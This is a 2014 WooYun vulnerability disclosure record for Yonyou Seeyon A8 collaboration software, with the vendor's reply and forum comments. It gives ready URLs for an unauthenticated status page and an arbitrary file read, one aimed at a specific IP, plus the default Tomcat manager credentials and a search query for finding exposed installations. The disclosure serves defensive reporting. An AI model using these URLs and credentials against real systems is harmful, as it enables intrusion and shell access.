{"id": 4750, "wybug_id": "wooyun-2014-049390", "wybug_title": "用友致远A8协同管理软件未授权访问+Getshell", "wybug_corp": "seeyon.com", "wybug_author": "loli", "wybug_date": "2014-01-21 14:27", "wybug_open_date": "2014-04-18 14:28", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "文件操作参数未加过滤", "敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-22：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-03-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-04-18：\t细节向公众公开  简要描述： 用友致远A8协同管理软件存在多个漏洞 详细说明：  1.敏感信息泄露该地址为性能监控后台，存在未授权访问\nhttp://x.x.x.x/seeyon/management/status.jsp\n2.任意文件读取漏洞由于对filename未进行过滤，导致可下载读取任意文件\nhttp://x.x.x.x/seeyon/main.do?method=officeDown&filename=c:/boot.ini\n3.tomcat manager Getshell利用（1）中打印的环境变量可得到网站的绝对路径：\n\n结合（2）漏洞进行文件读取，读取tomcat-users.xml文件中的登陆用户名及密码进行登陆。如：\nhttp://122.156.217.45:8080/seeyon/main.do?method=officeDown&filename=D:/UFSeeyon/A8/Group/ApacheJetspeed/conf/tomcat-users.xml\n\nhttp://x.x.x.x/manager/html\n\n<tomcat-users>  <role rolename=\"tomcat\"/>  <role rolename=\"role1\"/>  <role rolename=\"manager\"/>  <user username=\"tomcat\" password=\"tomcat\" roles=\"tomcat\"/>  <user username=\"both\" password=\"tomcat\" roles=\"tomcat,role1\"/>  <user username=\"role1\" password=\"tomcat\" roles=\"role1\"/>  <user username=\"seeyon\" password=\"qwerasdf\" roles=\"tomcat,role1,manager\"/></tomcat-users>\n\n\n   漏洞证明：  \n\n很多客户在使用：\nhttp://www.baidu.com/s?tn=baiduhome_pg&ie=utf-8&bs=%E6%9B%B4%E6%94%B9%E8%AF%AD%E8%A8%80%3A+A8%E4%BC%81%E4%B8%9A%E7%89%88+%28%E5%B9%B6%E5%8F%91%E6%95%B0%3A500%29+%E7%94%A8%E6%88%B7%E5%90%8D+%3A+%E5%AF%86%E7%A0%81%3A+%E8%BE%85%E5%8A%A9%E7%A8%8B%E5%BA%8F%E5%AE%89%E8%A3%85+www.seeyo&f=8&rsv_bp=1&wd=%E6%9B%B4%E6%94%B9%E8%AF%AD%E8%A8%80%3A+A8%E4%BC%81%E4%B8%9A%E7%89%88+%28%E5%B9%B6%E5%8F%91%E6%95%B0%3A500%29+%E7%94%A8%E6%88%B7%E5%90%8D+%3A+%E5%AF%86%E7%A0%81%3A+%E8%BE%85%E5%8A%A9%E7%A8%8B%E5%BA%8F%E5%AE%89%E8%A3%85+&rsv_sug3=1&rsv_sug4=59&inputT=343\n\n\n   修复方案：  1.性能监控后台进行授权访问；2.对filename参数进严格过滤；3.删除manager管理后台或禁止登陆；（tomcat-users.xml中账号seeyon和密码qwerasdf为安装默认）   版权声明：转载请注明来源 loli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-04-18 14:28 厂商回复： 非常感谢loli！这个问题是在V3.10sp2出现的（2009年发布），我们从V3.12已经修复了这个漏洞（2010年发布），我们已经安排客户人员联系客户尽快升级。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-01-20 21:23 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  不错围观    \n     2014-01-20 21:27 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @loli 还有致命的XSS....     \n     2014-01-21 12:23 |    \t\t北京致远协创软件有限公司(乌云厂商)\t\t \n  麻烦你把厂家转给“seeyon.com”，有专人对接处理    \n     2014-01-21 14:19 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  @北京致远协创软件有限公司 @xsser @疯狗    \n     2014-01-21 14:21 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:550 漏洞数:52        )\t\t \n  @北京致远协创软件有限公司 我编辑不了了。。。    \n     2014-01-21 14:28 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @loli @北京致远协创软件有限公司 已经转了，厂商及时处理吧 ：）    \n     2014-01-22 10:44 |    \t\t北京致远协创软件有限公司(乌云厂商)\t\t \n  @loli 看上去你对致远的产品还是比较了解的，欢迎你直接跟他联系 tanmf#seeyon.com    \n     2014-01-23 23:45 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @北京致远协创软件有限公司 居然是分部门的？还是说不同子公司？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}